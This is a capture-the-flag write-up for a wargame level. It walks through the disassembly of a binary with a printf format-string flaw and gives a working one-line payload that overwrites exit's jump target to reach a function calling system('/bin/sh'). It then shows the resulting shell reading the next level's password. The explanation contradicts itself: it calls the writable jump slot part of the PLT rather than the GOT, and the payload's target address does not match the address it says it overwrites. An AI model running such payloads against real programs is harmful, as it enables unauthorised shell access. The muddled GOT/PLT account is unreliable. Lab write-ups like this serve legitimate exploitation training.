# STILL PRINTF FORMAT STRING VULNERABILITY, BUT INFECTING THE PLT TABLE INSTEAD

```
08048504 <main>:
 8048504:	55                   	push   ebp
 8048505:	89 e5                	mov    ebp,esp
 8048507:	83 e4 f0             	and    esp,0xfffffff0
 804850a:	e8 b3 ff ff ff       	call   80484c2 <n>
 804850f:	c9                   	leave  
 8048510:	c3                   	ret    
```
Main function only calls `n` and then exits. So the vulnerability is in `n`.

```
080484c2 <n>:
 80484c2:	55                   	push   ebp
 80484c3:	89 e5                	mov    ebp,esp
 80484c5:	81 ec 18 02 00 00    	sub    esp,0x218
 80484cb:	a1 48 98 04 08       	mov    eax,ds:0x8049848
 80484d0:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484d4:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 80484db:	00 
 80484dc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484e2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484f0:	89 04 24             	mov    DWORD PTR [esp],eax
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 80484f8:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>
```
The vulnerability is in the call to `printf` : the user input is directly passed as the format string, but what address can we modify to exploit it ?

```
080484a4 <o>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	83 ec 18             	sub    esp,0x18
 80484aa:	c7 04 24 f0 85 04 08 	mov    DWORD PTR [esp],0x80485f0
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
 80484b6:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>
```
There is a function `o` that calls `system("/bin/sh")` and then exits. So if we can modify an address to point to `o`, we can get a shell. But which address can we modify ? The GOT table is not writable, but the PLT table is

```
080484c2 <n>:
 ...
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 ...
 80484f8:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>
```

```
080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    DWORD PTR ds:0x8049838
```
After printf gets called, the exit function of the PLT table is called, at its code address (0x080483d0) its jumping at the address at 0x8049838. If we can overwrite it to point to `o` (0x80484a4 = 134513828), then when `n` tries to exit, it will call `o` instead and we will get a shell.

```
~$ ./level5
aaaa %p %p %p %p 
aaaa 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 
~$ python -c 'print "\xd0\x83\x04\x08" + "%134513824d" + "%4$n"' > /tmp/exploit5
~$ cat /tmp/exploit5 - | ./level5
...

...
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
As usual, calculate the offset of printf format string on the stack (4), then write the address of `o` to the 0x8049838 in the PLT table.
